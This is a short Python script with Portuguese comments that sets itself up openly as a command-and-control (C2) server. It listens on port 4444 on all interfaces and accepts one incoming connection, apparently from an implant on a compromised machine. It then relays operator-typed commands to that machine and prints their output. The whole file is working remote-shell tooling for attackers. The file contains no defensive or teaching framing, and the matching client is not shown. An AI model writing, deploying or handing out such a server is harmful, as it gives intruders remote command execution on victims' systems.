import socket

HOST = '0.0.0.0'  # Interfaces em escuta (todas)
PORT = 4444       # Porta do C2

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((HOST, PORT))
    server.listen(5)
    print(f"[+] Servidor C2 ouvindo em {HOST}:{PORT}")

    client_socket, addr = server.accept()
    print(f"[+] Conexão recebida de {addr[0]}:{addr[1]}")

    while True:
        command = input("C2> ")
        if command.strip().lower() == "exit":
            client_socket.send(b"exit")
            break

        client_socket.send(command.encode())
        result = client_socket.recv(4096).decode()
        print(result)

    client_socket.close()
    server.close()

if __name__ == "__main__":
    start_server()